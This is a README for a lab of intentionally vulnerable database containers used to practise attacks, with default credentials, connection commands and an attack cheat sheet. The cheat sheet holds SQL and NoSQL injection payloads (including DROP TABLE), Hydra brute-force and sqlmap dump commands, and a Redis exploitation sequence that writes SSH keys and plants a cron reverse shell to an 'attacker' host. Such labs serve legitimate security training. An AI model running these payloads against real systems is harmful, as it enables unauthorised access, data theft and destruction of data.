# Database Targets

Vulnerable database configurations for practicing database security testing and exploitation.

## 🎯 Database Services

### 1. MongoDB
- **Port:** 27017
- **Credentials:** admin:password
- **Version:** 4.0 (with known vulnerabilities)
- **Vulnerabilities:** Weak authentication, NoSQL injection potential

**Connection:**
```bash
mongo --host localhost --port 27017 -u admin -p password --authenticationDatabase admin

# NoSQL injection testing
mongosh "mongodb://admin:password@localhost:27017/"
```

### 2. Redis
- **Port:** 6379
- **Password:** weakpass
- **Protected Mode:** Disabled
- **Vulnerabilities:** Weak password, unprotected access, potential RCE

**Connection:**
```bash
redis-cli -h localhost -p 6379 -a weakpass

# Test commands
INFO
CONFIG GET *
EVAL "return {KEYS[1],ARGV[1]}" 1 key value
```

### 3. PostgreSQL
- **Port:** 5432
- **Credentials:** postgres:postgres
- **Database:** testdb
- **Vulnerabilities:** Default credentials, SQL injection practice

**Connection:**
```bash
psql -h localhost -p 5432 -U postgres -d testdb
# Password: postgres

# SQL injection testing
' OR '1'='1
'; DROP TABLE users--
```

### 4. MySQL
- **Port:** 3307
- **Credentials:** 
  - root:root
  - dbuser:dbpass
- **Database:** vulnerable_db
- **Vulnerabilities:** Weak passwords, SQL injection, privilege escalation

**Connection:**
```bash
mysql -h localhost -P 3307 -u root -proot

# Alternative user
mysql -h localhost -P 3307 -u dbuser -pdbpass vulnerable_db
```

### 5. Elasticsearch
- **Port:** 9200 (HTTP), 9300 (Transport)
- **Authentication:** Disabled
- **Version:** 7.9.0
- **Vulnerabilities:** No authentication, data exposure, potential RCE

**Connection:**
```bash
# Query cluster
curl http://localhost:9200/

# List indices
curl http://localhost:9200/_cat/indices

# Search data
curl http://localhost:9200/_search?pretty

# Potentially dangerous operations
curl -X PUT http://localhost:9200/test_index
```

### 6. CouchDB
- **Port:** 5984
- **Credentials:** admin:admin
- **Vulnerabilities:** Weak credentials, admin party mode exploits

**Connection:**
```bash
# Access Fauxton UI
http://localhost:5984/_utils/

# API access
curl http://admin:admin@localhost:5984/

# List databases
curl http://admin:admin@localhost:5984/_all_dbs
```

## 🎓 Learning Objectives

### 1. Enumeration
- Service detection with nmap
- Version fingerprinting
- Default credential testing
- Banner grabbing

### 2. Authentication Attacks
- Brute force attacks
- Default credential exploitation
- Password spraying
- Authentication bypass

### 3. Injection Attacks
- SQL injection (MySQL, PostgreSQL)
- NoSQL injection (MongoDB)
- Command injection via Redis
- LDAP injection concepts

### 4. Data Extraction
- Database dumping
- Sensitive data extraction
- Backup file access
- Configuration disclosure

### 5. Privilege Escalation
- User enumeration
- Role exploitation
- Database privilege escalation
- File system access

## 🛠️ Attack Tools

### Enumeration
```bash
# Nmap database scans
nmap -p 3307,5432,6379,27017,5984,9200 -sV localhost

# Service-specific scans
nmap -p 27017 --script mongodb-* localhost
nmap -p 6379 --script redis-* localhost
nmap -p 3307 --script mysql-* localhost
```

### Brute Force
```bash
# Hydra examples
hydra -l admin -P /path/to/wordlist.txt mongodb://localhost:27017
hydra -l postgres -P /path/to/wordlist.txt postgres://localhost:5432
hydra -l root -P /path/to/wordlist.txt mysql://localhost:3307

# Redis password cracking
redis-cli -h localhost -p 6379 -a password_attempt
```

### SQL Injection
```bash
# SQLMap
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D database --tables
sqlmap -u "http://target/page?id=1" -D database -T table --dump

# Manual testing
' OR 1=1--
'; DROP TABLE users--
' UNION SELECT null,username,password FROM users--
```

### NoSQL Injection
```javascript
// MongoDB injection examples
{"$gt": ""}
{"$ne": null}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// URL encoded
username[$ne]=null&password[$ne]=null
```

### Redis Exploitation
```bash
# Connect
redis-cli -h localhost -p 6379 -a weakpass

# Enumerate
INFO
CONFIG GET dir
CONFIG GET dbfilename
KEYS *

# Write SSH key (if filesystem accessible)
config set dir /root/.ssh/
config set dbfilename authorized_keys
set key "ssh-rsa AAAA..."
save

# RCE via cron job
config set dir /var/spool/cron/
config set dbfilename root
set key "\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\n"
save
```

## 📊 Common Vulnerabilities

| Database | CVE/Issue | Impact |
|----------|-----------|---------|
| MongoDB | CVE-2019-2386 | Authentication bypass |
| Redis | CVE-2022-0543 | RCE via Lua sandbox escape |
| PostgreSQL | CVE-2019-9193 | Copy from program RCE |
| MySQL | CVE-2016-6662 | Privilege escalation |
| Elasticsearch | CVE-2014-3120 | RCE via dynamic scripting |
| CouchDB | CVE-2017-12635 | Privilege escalation |

## 🚀 Practice Scenarios

### Beginner
1. Connect to each database with provided credentials
2. List databases and tables
3. Extract sample data
4. Identify database versions

### Intermediate
1. Perform brute force attacks
2. Test for SQL/NoSQL injection
3. Dump entire database contents
4. Extract password hashes

### Advanced
1. Achieve RCE via Redis
2. Escalate privileges in PostgreSQL
3. Exploit Elasticsearch APIs
4. Chain multiple database compromises

## 🔍 Quick Wins

```bash
# Test all databases quickly
nmap -p 3307,5432,6379,27017,5984,9200 -sV localhost

# Try default creds
mysql -h localhost -P 3307 -u root -proot
psql -h localhost -p 5432 -U postgres
mongo --host localhost --port 27017 -u admin -p password
redis-cli -h localhost -p 6379 -a weakpass

# Check for unauthenticated access
curl http://localhost:9200/
curl http://localhost:5984/
```

## ⚠️ Security Notes

- All databases use weak/default credentials by design
- No encryption in transit
- Minimal security configurations
- Perfect for practicing offensive techniques
- **NEVER** use these configurations in production
- Keep containers isolated and not exposed to internet

## 📚 Resources

- [HackTricks - Database Pentesting](https://book.hacktricks.xyz/network-services-pentesting)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [NoSQL Injection Cheatsheet](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [Redis Security](https://redis.io/topics/security)
